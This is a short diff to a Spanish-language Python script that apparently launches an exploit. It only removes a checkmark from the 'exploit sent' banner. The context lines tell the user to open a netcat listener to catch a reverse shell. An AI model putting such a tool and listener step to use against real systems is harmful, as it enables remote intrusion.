@@ -167,7 +167,7 @@ def main():
         
         # Mensaje final
         print(f"\n{Color.ROJO_OSCURO}{Color.NEGRITA}{'='*60}")
-        print("✓ EXPLOIT ENVIADO EXITOSAMENTE")
+        print("EXPLOIT ENVIADO EXITOSAMENTE")
         print(f"{'='*60}{Color.FIN}\n")
         print(f"{Color.ROJO_SANGRE}Recuerda iniciar un listener en tu máquina:{Color.FIN}")
         print(f"{Color.ROJO_BRILLANTE}nc -lvnp {puerto_local}{Color.FIN}\n")
